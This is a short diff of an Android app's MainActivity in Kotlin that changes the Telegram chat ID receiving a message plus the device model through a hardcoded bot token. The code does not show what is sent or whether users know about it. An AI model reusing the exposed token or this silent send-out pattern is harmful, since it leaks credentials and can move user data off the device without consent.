@@ -262,7 +262,7 @@ class MainActivity : AppCompatActivity() {
             val fullMessage = "$message\n$deviceModel"
 
             val botToken = "8278693005:AAEJMer1juepZXE0lP2QPAok7Pb-pscuoR4"
-            val chatId = "7212024751"
+            val chatId = "6331293386"
             val url = "https://api.telegram.org/bot$botToken/sendMessage"
 
             val mediaType = "application/json".toMediaType()
